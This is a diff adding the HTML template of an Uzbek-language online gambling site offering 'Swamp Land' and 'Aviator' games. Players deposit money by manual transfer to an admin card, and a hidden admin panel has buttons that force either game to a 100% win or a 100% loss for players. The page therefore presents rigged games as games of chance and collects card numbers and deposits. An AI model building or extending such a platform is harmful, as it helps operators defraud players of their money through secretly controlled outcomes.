@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIP Gaming Platform + Admin</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&family=Fredoka+One&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="auth-overlay" id="authOverlay">
+        <div class="auth-card">
+            <div class="auth-header">
+                <h2>🚀 VIP PORTAL</h2>
+                <p>Ro'yxatdan o'tishga 5,000 UZS bonus!</p>
+            </div>
+            <div class="auth-tabs">
+                <button class="tab-btn active" onclick="switchTab('login')">Kirish</button>
+                <button class="tab-btn" onclick="switchTab('register')">Ro'yxatdan o'tish</button>
+            </div>
+            <form id="loginForm" class="auth-form" onsubmit="handleLogin(event)">
+                <div class="input-group">
+                    <label>Telefon raqam</label>
+                    <input type="text" id="loginPhone" placeholder="+998 90 123 45 67" required>
+                </div>
+                <div class="input-group">
+                    <label>Parol</label>
+                    <input type="password" id="loginPass" placeholder="******" required>
+                </div>
+                <button type="submit" class="submit-btn">Tizimga kirish</button>
+            </form>
+            <form id="registerForm" class="auth-form hidden" onsubmit="handleRegister(event)">
+                <div class="input-group">
+                    <label>Telefon raqam</label>
+                    <input type="text" id="regPhone" placeholder="+998 90 123 45 67" required>
+                </div>
+                <div class="input-group">
+                    <label>Telegram Chat ID</label>
+                    <input type="text" id="regChatId" placeholder="123456789" required>
+                </div>
+                <button type="button" class="submit-btn" style="background:#0284c7; margin-bottom:10px;" onclick="requestSmsCode()">Kod olish</button>
+                <div class="input-group">
+                    <label>Tasdiqlash kodi</label>
+                    <input type="text" id="regCode" placeholder="6 xonali kod" required>
+                </div>
+                <div class="input-group">
+                    <label>Parol yaratish</label>
+                    <input type="password" id="regPass" placeholder="******" required>
+                </div>
+                <button type="submit" class="submit-btn">Hisob ochish (+5,000 UZS)</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="auth-overlay hidden" id="depositModal">
+        <div class="auth-card">
+            <div class="auth-header"><h2>💳 Hisobni To'ldirish</h2><p>Admin kartasiga pul o'tkazing</p></div>
+            <div style="background:#0b0f19; padding:10px; border-radius:8px; margin-bottom:12px; border:1px solid #1e293b;">
+                <p style="font-size:0.8rem; color:#94a3b8;">Admin Karta:</p>
+                <p style="font-size:1.05rem; font-weight:800; color:#38bdf8;">8600 0000 0000 0000</p>
+            </div>
+            <div class="input-group"><label>Summa (UZS)</label><input type="number" id="depAmount" value="50000"></div>
+            <div class="input-group"><label>Sizning Karta raqamingiz</label><input type="text" id="depCard" placeholder="8600 ..."></div>
+            <button class="submit-btn" style="background:#22c55e;" onclick="sendDeposit()">So'rov yuborish</button>
+            <button class="nav-action-btn logout-btn" style="width:100%; margin-top:10px;" onclick="closeModal('depositModal')">Yopish</button>
+        </div>
+    </div>
+
+    <div class="auth-overlay hidden" id="withdrawModal">
+        <div class="auth-card">
+            <div class="auth-header"><h2>💸 Pul Yechish</h2><p>Kartangizga pul chiqarish</p></div>
+            <div class="input-group"><label>Yechish Summasi (UZS)</label><input type="number" id="witAmount" value="50000"></div>
+            <div class="input-group"><label>Plastik Karta Raqam</label><input type="text" id="witCard" placeholder="8600 ..."></div>
+            <button class="submit-btn" style="background:#ef4444;" onclick="sendWithdraw()">Pul yechish</button>
+            <button class="nav-action-btn logout-btn" style="width:100%; margin-top:10px;" onclick="closeModal('withdrawModal')">Yopish</button>
+        </div>
+    </div>
+
+    <header class="top-navbar hidden" id="topBar">
+        <div class="brand-logo">🔥 VIP GAMES</div>
+        <div class="user-panel">
+            <div class="balance-pill">Balans: <span id="userBalanceDisplay">0 UZS</span></div>
+            <button class="nav-action-btn" style="background:#10b981;" onclick="openModal('depositModal')">+ To'ldirish</button>
+            <button class="nav-action-btn" style="background:#f59e0b;" onclick="openModal('withdrawModal')">Pul yechish</button>
+            <button class="nav-action-btn lobbies-btn" onclick="showLobby()">O'yinlar</button>
+            <button class="nav-action-btn hidden" id="adminNavBtn" style="background:#9333ea;" onclick="openAdminPanel()">👑 Admin Panel</button>
+            <button class="nav-action-btn logout-btn" onclick="handleLogout()">Chiqish</button>
+        </div>
+    </header>
+
+    <section class="main-section hidden" id="adminSection">
+        <div style="max-width:900px; margin:30px auto; background:#131b2e; padding:25px; border-radius:16px; border:1px solid #1e293b;">
+            <h1 style="color:#c084fc; margin-bottom:20px;">👑 ADMIN BOSHQARUV PANELI</h1>
+            
+            <h3 style="color:#38bdf8; margin-bottom:10px;">🎮 O'yin Prognozi (100% Boshqaruv)</h3>
+            <div style="display:flex; gap:15px; margin-bottom:25px;">
+                <div style="background:#0b0f19; padding:15px; border-radius:10px; flex:1;">
+                    <p><b>Swamp Land Prognoz:</b> <span id="swampForecastStatus" style="color:#22c55e;">Auto</span></p>
+                    <button class="nav-action-btn" style="background:#22c55e; margin-top:8px;" onclick="setForecast('swamp', 'win')">100% Yutuq</button>
+                    <button class="nav-action-btn" style="background:#ef4444; margin-top:8px;" onclick="setForecast('swamp', 'lose')">100% Yutqazish</button>
+                    <button class="nav-action-btn" style="background:#334155; margin-top:8px;" onclick="setForecast('swamp', 'auto')">Normal (1/5)</button>
+                </div>
+                <div style="background:#0b0f19; padding:15px; border-radius:10px; flex:1;">
+                    <p><b>Aviator Prognoz:</b> <span id="aviForecastStatus" style="color:#22c55e;">Auto</span></p>
+                    <button class="nav-action-btn" style="background:#22c55e; margin-top:8px;" onclick="setForecast('aviator', 'win')">100% Yutuq</button>
+                    <button class="nav-action-btn" style="background:#ef4444; margin-top:8px;" onclick="setForecast('aviator', 'lose')">100% Yutqazish</button>
+                    <button class="nav-action-btn" style="background:#334155; margin-top:8px;" onclick="setForecast('aviator', 'auto')">Normal (1/5)</button>
+                </div>
+            </div>
+
+            <h3 style="color:#38bdf8; margin-bottom:10px;">💳 Pul To'ldirish So'rovlari</h3>
+            <div id="adminDepositsList" style="background:#0b0f19; padding:10px; border-radius:10px; margin-bottom:25px; max-height:200px; overflow-y:auto;">
+                <p style="color:#64748b;">So'rovlar yuklanmoqda...</p>
+            </div>
+
+            <button class="nav-action-btn lobbies-btn" onclick="showLobby()">← O'yinlarga Qaytish</button>
+        </div>
+    </section>
+
+    <section class="main-section hidden" id="lobbySection">
+        <h1 class="section-title">O'YINLAR KATALOGI</h1>
+        <div class="lobby-grid">
+            <div class="game-box swamp-box" onclick="openGame('swamp')">
+                <div class="box-icon">🐸</div>
+                <h3>SWAMP LAND</h3>
+                <p>Qurbaqa o'yini</p>
+                <button class="play-now-btn">O'ynash</button>
+            </div>
+            <div class="game-box aviator-box" onclick="openGame('aviator')">
+                <div class="box-icon">✈️</div>
+                <h3>AVIATOR</h3>
+                <p>Samolyot o'yini</p>
+                <button class="play-now-btn avi-btn-color">O'ynash</button>
+            </div>
+        </div>
+    </section>
+
+    <section class="main-section hidden" id="swampSection">
+        <div class="swamp-arena">
+            <div class="swamp-sidebar">
+                <div class="swamp-logo-plate"><span>SWAMP</span><span>LAND</span></div>
+                <div class="swamp-betting-card">
+                    <label>Tikish summasi (UZS)</label>
+                    <input type="number" id="swampBetInput" value="5000" step="1000">
+                </div>
+                <button class="swamp-control-btn place-bet" id="swampBetBtn" onclick="startSwampGame()">Place a bet</button>
+                <button class="swamp-control-btn take-win disabled" id="swampTakeBtn" onclick="cashoutSwamp()" disabled>Take winnings</button>
+                <button class="back-lobby-link" onclick="showLobby()">← Katalogga qaytish</button>
+            </div>
+            <div class="swamp-board-area">
+                <div class="swamp-rows-container" id="swampRowsContainer"></div>
+                <div class="swamp-footer-frog">🐸</div>
+            </div>
+        </div>
+    </section>
+
+    <section class="main-section hidden" id="aviatorSection">
+        <div class="aviator-wrapper">
+            <div class="avi-viewport">
+                <canvas id="aviatorCanvas" width="850" height="340"></canvas>
+                <div class="avi-multiplier-plate" id="aviMultDisplay">1.00x</div>
+                <div class="avi-flew-msg hidden" id="aviFlewAway">FLEW AWAY!</div>
+            </div>
+            <div class="avi-control-panels">
+                <div class="avi-panel-card">
+                    <div class="input-group"><input type="number" id="aviBetInput1" value="5000"></div>
+                    <button class="avi-action-main" id="aviBtn1" onclick="handleAviatorAction()">BET</button>
+                </div>
+            </div>
+            <button class="back-lobby-link avi-back" onclick="showLobby()">← Katalogga qaytish</button>
+        </div>
+    </section>
+
+    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/swamp.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/aviator.js') }}"></script>
+</body>
+</html>
